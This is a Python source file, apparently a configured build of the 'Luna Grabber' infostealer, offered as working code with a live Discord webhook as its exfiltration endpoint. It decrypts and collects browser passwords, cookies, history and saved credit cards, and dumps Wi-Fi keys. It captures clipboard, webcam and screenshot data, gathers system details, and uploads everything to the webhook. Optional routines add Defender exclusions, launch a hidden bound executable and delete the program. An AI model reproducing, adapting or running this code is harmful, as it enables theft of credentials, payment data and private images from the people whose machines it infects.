__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1356102640290893955/VNeBrXRoBzbuCTeaSy6SDmJV4d-XPAO8QCuIq9l_g1ML-QSlYu0HWxqFyr-kHjTI0wrM', 'ping': True, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': False, 'systeminfo': True, 'common_files': False, 'browser': True, 'roblox': False, 'obfuscation': False, 'injection': False, 'wifi': True, 'antidebug_vm': False, 'discord': False, 'anti_spam': False, 'self_destruct': True, 'clipboard': True, 'webcam': True, 'games': False, 'screenshot': True, 'mutex': 'zplRMyR6y74OGIRv', 'wallets': False}

import concurrent.futures
import ctypes
import json
import os
import random
import requests
import subprocess
import sys
import zlib
from multiprocessing import cpu_count
from requests_toolbelt.multipart.encoder import MultipartEncoder
from zipfile import ZIP_DEFLATED, ZipFile
import psutil

#global variables
temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
localappdata = os.getenv("localappdata")
if not hasattr(sys, "_MEIPASS"):
	sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))


def main(webhook: str):
	threads = []

	if __CONFIG__["fakeerror"]:
		threads.append(Fakeerror)
	if __CONFIG__["startup"]:
		threads.append(Startup)
	if __CONFIG__["defender"]:
		threads.append(Defender)
	if __CONFIG__["browser"]:
		threads.append(Browsers)
	if __CONFIG__["wifi"]:
		threads.append(Wifi)
	if __CONFIG__["common_files"]:
		threads.append(CommonFiles)
	if __CONFIG__["clipboard"]:
		threads.append(Clipboard)
	if __CONFIG__["webcam"]:
		threads.append(capture_images)
	if __CONFIG__["wallets"]:
		threads.append(steal_wallets)
	if __CONFIG__["games"]:
		threads.append(Games)

	if __CONFIG__["browser"] or __CONFIG__["roblox"]:
		browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
			"7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
		browsers_found = []
		for proc in psutil.process_iter(['name']):
			process_name = proc.info['name'].lower()
			if process_name in browser_exe:
				browsers_found.append(proc)

		for proc in browsers_found:
			try:
				proc.kill()
			except Exception:
				pass

	with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
		executor.map(lambda func: func(), threads)

	max_archive_size = 1024 * 1024 * 25
	current_archive_size = 0

	_zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
	with ZipFile(_zipfile, "w", ZIP_DEFLATED) as zipped_file:
		for dirname, _, files in os.walk(temp_path):
			for filename in files:
				absname = os.path.join(dirname, filename)
				arcname = os.path.relpath(absname, temp_path)
				file_size = os.path.getsize(absname)
				if current_archive_size + file_size <= max_archive_size:
					zipped_file.write(absname, arcname)
					current_archive_size += file_size
				else:
					break

	data = {
		"username": "Luna",
		"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
	}

	_file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'

	if __CONFIG__["ping"]:
		if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
			content = f"@{__CONFIG__['pingtype'].lower()}"
			data.update({"content": content})

	if any(__CONFIG__[key] for key in ["browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
		with open(_file, 'rb') as file:
			encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
			requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
	else:
		requests.post(webhook, json=data)

	if __CONFIG__["systeminfo"]:
		PcInfo()

	if __CONFIG__["discord"]:
		Discord()

	if __CONFIG__["roblox"]:
		Roblox()

	if __CONFIG__["screenshot"]:
		Screenshot()

	os.remove(_file)

def Luna(webhook: str):
	def GetSelf() -> tuple[str, bool]:
		if hasattr(sys, "frozen"):
			return (sys.argv[0], True)
		else:
			return (__file__, False)    

	def ExcludeFromDefender(path) -> None:
		if __CONFIG__["defender"]:
			subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
		
	def IsConnectedToInternet() -> bool:
		try:
			return requests.get("https://gstatic.com/generate_204").status_code == 204
		except Exception:
			return False
		
	if not IsConnectedToInternet():
		if not __CONFIG__["startup"]:
			os._exit(0)

	def CreateMutex(mutex: str) -> bool:
		kernel32 = ctypes.windll.kernel32
		mutex = kernel32.CreateMutexA(None, False, mutex)
		return kernel32.GetLastError() != 183
	
	if not CreateMutex(__CONFIG__["mutex"]):
		os._exit(0)
		

	path, isExecutable = GetSelf()
	inStartup = os.path.basename(os.path.dirname(path)).lower() == "startup"
	if isExecutable and (__CONFIG__["bound_startup"] or not inStartup) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.luna")):
		if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")):
			os.remove(boundFileDst)
		with open(boundFileSrc, "rb") as f:
			content = f.read()
		decrypted = zlib.decompress(content[::-1])
		with open(boundFileDst, "wb") as f:
			f.write(decrypted)
		del content, decrypted
				  
		ExcludeFromDefender(boundFileDst)
		subprocess.Popen("start bound.exe", shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
		

	if __CONFIG__["anti_spam"]:
		AntiSpam()

	if __CONFIG__["antidebug_vm"]:
		Debug()

	with concurrent.futures.ThreadPoolExecutor() as executor:
		if __CONFIG__["injection"]:
			executor.submit(Injection, webhook)
		executor.submit(main, webhook)

	if __CONFIG__["self_destruct"]:
		SelfDestruct()



# Options get put here
import base64
import sqlite3
import threading
from Cryptodome.Cipher import AES
import shutil
from typing import Union
from win32crypt import CryptUnprotectData

class Browsers:
	def __init__(self):
		self.appdata = os.getenv('LOCALAPPDATA')
		self.roaming = os.getenv('APPDATA')
		self.browsers = {
			'kometa': self.appdata + '\\Kometa\\User Data',
			'orbitum': self.appdata + '\\Orbitum\\User Data',
			'cent-browser': self.appdata + '\\CentBrowser\\User Data',
			'7star': self.appdata + '\\7Star\\7Star\\User Data',
			'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
			'vivaldi': self.appdata + '\\Vivaldi\\User Data',
			'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
			'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
			'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
			'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
			'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
			'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
			'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
			'iridium': self.appdata + '\\Iridium\\User Data',
			'opera': self.roaming + '\\Opera Software\\Opera Stable',
			'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
		}

		self.profiles = [
			'Default',
			'Profile 1',
			'Profile 2',
			'Profile 3',
			'Profile 4',
			'Profile 5',
		]

		os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

		def process_browser(name, path, profile, func):
			try:
				func(name, path, profile)
			except Exception:
				pass

		threads = []
		for name, path in self.browsers.items():
			if not os.path.isdir(path):
				continue

			self.masterkey = self.get_master_key(path + '\\Local State')
			self.funcs = [
				self.cookies,
				self.history,
				self.passwords,
				self.credit_cards
			]

			for profile in self.profiles:
				for func in self.funcs:
					thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
					thread.start()
					threads.append(thread)

		for thread in threads:
			thread.join()

		self.roblox_cookies()
		self.robloxinfo(__CONFIG__["webhook"])

	def get_master_key(self, path: str) -> str:
		try:
			with open(path, "r", encoding="utf-8") as f:
				c = f.read()
			local_state = json.loads(c)
			master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
			master_key = master_key[5:]
			master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
			return master_key
		except Exception:
			pass

	def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = AES.new(master_key, AES.MODE_GCM, iv)
		decrypted_pass = cipher.decrypt(payload)
		decrypted_pass = decrypted_pass[:-16].decode()
		return decrypted_pass

	def passwords(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\Login Data'
		else:
			path += '\\' + profile + '\\Login Data'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
		password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
		for results in cursor.fetchall():
			if not results[0] or not results[1] or not results[2]:
				continue
			url = results[0]
			login = results[1]
			password = self.decrypt_password(results[2], self.masterkey)
			with open(password_file_path, "a", encoding="utf-8") as f:
				if os.path.getsize(password_file_path) == 0:
					f.write("Website  |  Username  |  Password\n\n")
				f.write(f"{url}  |  {login}  |  {password}\n")
		cursor.close()
		conn.close()

	def cookies(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\Network\\Cookies'
		else:
			path += '\\' + profile + '\\Network\\Cookies'
		if not os.path.isfile(path):
			return
		cookievault = create_temp()
		shutil.copy2(path, cookievault)
		conn = sqlite3.connect(cookievault)
		cursor = conn.cursor()
		with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
			f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
			for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
				host_key, name, path, encrypted_value, expires_utc = res
				value = self.decrypt_password(encrypted_value, self.masterkey)
				if host_key and name and value != "":
					f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
		cursor.close()
		conn.close()
		os.remove(cookievault)

	def history(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\History'
		else:
			path += '\\' + profile + '\\History'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		history_file_path = os.path.join(temp_path, "Browser", "history.txt")
		with open(history_file_path, 'a', encoding="utf-8") as f:
			if os.path.getsize(history_file_path) == 0:
				f.write("Url  |  Visit Count\n\n")
			for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
				url, visit_count = res
				f.write(f"{url}  |  {visit_count}\n")
		cursor.close()
		conn.close()

	def credit_cards(self, name: str, path: str, profile: str):
		if name in ['opera', 'opera-gx']:
			path += '\\Web Data'
		else:
			path += '\\' + profile + '\\Web Data'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
		with open(cc_file_path, 'a', encoding="utf-8") as f:
			if os.path.getsize(cc_file_path) == 0:
				f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
			for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
				name_on_card, expiration_month, expiration_year, card_number_encrypted = res
				card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
				f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
		cursor.close()
		conn.close()

def create_temp(_dir: Union[str, os.PathLike] = None):
	if _dir is None:
		_dir = os.path.expanduser("~/tmp")
	if not os.path.exists(_dir):
		os.makedirs(_dir)
	file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
	path = os.path.join(_dir, file_name)
	open(path, "x").close()
	return path

import pyperclip

class Clipboard:
	def __init__(self):
		self.directory = os.path.join(temp_path, "Clipboard")
		os.makedirs(self.directory, exist_ok=True)
		self.get_clipboard()

	def get_clipboard(self):
		content = pyperclip.paste()
		if content:
			with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
				file.write(content)
		else:
			with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
				file.write("Clipboard is empty")

import pycountry

class PcInfo:
    def __init__(self):
        self.avatar = "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
        self.username = "Luna"
        self.get_system_info(__CONFIG__["webhook"])

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "white"
        
    def get_all_avs(self) -> str:
        process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
        if process.returncode == 0:
            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
            if len(output) >= 2:
                output = output[1:]
                output = [av.strip() for av in output]
                return ", ".join(output)

    def get_system_info(self, webhook):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"

        try:
            r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
            if r["status"] != "success":
                raise Exception("Failed")
            country = r["country"]
            proxy = r["proxy"]
            ip = r["query"]   
        except Exception:
            country = "Failed to get country"
            proxy = "Failed to get proxy"
            ip = "Failed to get IP"
                  
        _, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        data = {
            "embeds": [
                {
                    "title": "Luna Logger",
                    "color": 5639644,
                    "fields": [
                        {
                             "name": "System Info",
                             "value": f''':computer: **PC Username:** `{username}`
:desktop: **PC Name:** `{hostname}`
:globe_with_meridians: **OS:** `{computer_os}`
<:windows:1239719032849174568> **Product Key:** `{product_key}`\n
:eyes: **IP:** `{ip}`
:flag_{self.get_country_code(country)}: **Country:** `{country}`
{":shield:" if proxy else ":x:"} **Proxy:** `{proxy}`
:green_apple: **MAC:** `{mac}`
:wrench: **UUID:** `{uuid}`\n
<:cpu:1051512676947349525> **CPU:** `{cpu}`
<:gpu:1051512654591688815> **GPU:** `{gpu}`
<:ram1:1051518404181368972> **RAM:** `{ram}GB`\n
:cop: **Antivirus:** `{self.get_all_avs()}`
'''
                        }
                    ],
                    "footer": {
                        "text": "Luna Grabber | Created By Smug"
                    },
                    "thumbnail": {
                        "url": self.avatar
                    }
                }
            ],
            "username": self.username,
            "avatar_url": self.avatar
        }

        requests.post(webhook, json=data)


class SelfDestruct():
    def __init__(self):
        self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        self.delete()

    def GetSelf(self) -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)
        
    def delete(self):
        path, isExecutable = self.GetSelf()
        source_path = os.path.abspath(path)
        if os.path.basename(os.path.dirname(source_path)).lower() == "startup":
            return
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)


class Wifi:
	def __init__(self):
		self.networks = {}
		self.get_networks()
		self.save_networks()


	def get_networks(self):
		try:
			output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
			profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
			
			for profile in profiles:
				if profile:
					self.networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
		except Exception:
			pass

	def save_networks(self):
		os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
		if self.networks:
			for network, info in self.networks.items():			
				with open(os.path.join(temp_path, "Wifi", f"{network}.txt"), "wb") as f:
					f.write(info.encode("utf-8"))
		else:
			with open(os.path.join(temp_path, "Wifi", "No Wifi Networks Found.txt"), "w") as f:
				f.write("No wifi networks found.")

import cv2

def capture_images(num_images=1):
	num_cameras = 0
	cameras = []
	os.makedirs(os.path.join(temp_path, "Webcam"), exist_ok=True)

	while True:
		cap = cv2.VideoCapture(num_cameras)
		if not cap.isOpened():
			break
		cameras.append(cap)
		num_cameras += 1

	if num_cameras == 0:
		return

	for _ in range(num_images):
		for i, cap in enumerate(cameras):
			ret, frame = cap.read()
			if ret:
				cv2.imwrite(os.path.join(temp_path, "Webcam", f"image_from_camera_{i}.jpg"), frame)

	for cap in cameras:
		cap.release()

from PIL import ImageGrab

class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):  
        image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )
        image.save(temp_path + "\\desktopshot.png")
        image.close()

    def send_screenshot(self):
        webhook_data = {
            "username": "Luna",
            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
            "embeds": [
                {
                    "color": 5639644,
                    "title": "Desktop Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }
        
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

        requests.post(__CONFIG__["webhook"], headers={'Content-type': encoder.content_type}, data=encoder)

Luna(__CONFIG__["webhook"])
